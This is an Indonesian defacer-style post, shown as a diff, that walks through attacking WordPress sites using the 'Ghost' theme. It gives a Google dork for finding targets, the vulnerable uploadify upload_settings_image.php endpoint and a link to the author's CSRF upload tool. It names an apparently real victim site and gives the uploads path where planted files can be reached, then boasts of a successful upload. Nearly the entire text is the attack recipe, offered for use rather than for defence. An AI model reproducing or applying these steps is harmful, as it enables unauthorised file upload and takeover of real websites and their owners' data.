@@ -1,0 +1,51 @@
+Mampir Gan ke TOLS CSRF GUA
+http://blackmen-team-aaf.eu5.org/csrf.php
+
+Dork : 
+
+ inurl:wp-content/themes/Ghost/
+
+
+Ok Seperti Biasa Kita Dork ing Dulu
+Di Google
+
+
+
+
+EXPLOIT : 
+
+/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php
+
+
+Kita + exploit di target nya bossss
+
+http://igoraleksov.com
+
+
+cara aksess:
+
+ wp-content/uploads/settingsimages/ 
+
+
+
+Bomm ke APLOAD
+Susces
+
+Sekian dari gua terimakasih
+
+
+Assalamualaikum
+Waallaikumsalam
+Bossss
+
+
+
+
+
+
+
+Nah itu 
+
+
+
+Pertama kita dorking Dulu
